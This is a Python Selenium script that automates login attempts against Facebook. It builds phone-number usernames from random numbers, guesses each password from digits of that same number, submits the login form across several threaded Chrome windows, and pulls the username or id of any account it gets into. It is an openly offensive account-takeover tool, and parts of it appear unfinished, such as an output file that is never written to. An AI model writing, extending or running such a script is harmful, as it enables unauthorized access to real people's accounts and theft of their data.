from datetime import datetime
import os
from random import randint
from threading import Thread
from time import sleep
from selenium import webdriver 
from selenium.webdriver.common.by import By
from urllib import parse
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

DELAY = 5



def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPass, passwordIndex):
    currentTime = str(datetime.strftime(datetime.now(), "%Y-%m-%d__%H-%M-%S"))
    numberTried = []
    mainList = []
    tmpList = []
    while True:
        tmp = randint(firstNum, secondNum)
        if (tmp not in numberTried):
            numberTried.append(tmp)
            tmpList.append(tmp)
            if len(tmpList) == totalAccount // totalTabs:
                mainList.append(tmpList)
                tmpList = []
            if(len(mainList) == totalTabs):
                break       
    print(mainList)
        
    def tryWithCred(driver, number):
        password = ''
        if(passwordIndex < 0):
            password = str(number)[passwordIndex:]
        else:
            password = str(number)[:passwordIndex]

        emailInput = driver.find_element(By.ID, "email")
        emailInput.send_keys(f"{prefix}{number}")
        passInput = driver.find_element(By.ID, "pass")
        passInput.send_keys(password)
        loginBtn = driver.find_element(By.NAME, 'login')
        loginBtn.click()
        sleep(2)
        if not WebDriverWait(driver, DELAY/2).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div[1]/div/form"))):
            return
        driver.get("https://www.facebook.com/profile.php?")
        sleep(1)
        cUrl = driver.current_url
        urlData = dict(parse.parse_qsl(parse.urlsplit(cUrl).query))
        username = ""
        if(urlData == {}):
            username = cUrl.replace("https://www.facebook.com/", "")
            cUrl.replace("/", "")
        else:
            username = urlData['id']
        
            

    os.makedirs(currentTime)
    with open(f"{currentTime}/accounts.txt", "w") as f:
        pass
    for numbers in mainList:
        def tryAccount(numbers):
            driver = webdriver.Chrome(executable_path='./chromedriver.exe')
            for number in numbers:
                driver.get("https://www.facebook.com/")
                tryWithCred(driver, number)
                print(number)
            
        t = Thread(target=tryAccount, args=(numbers,))
        t.start()
    
    print({firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPass, passwordIndex})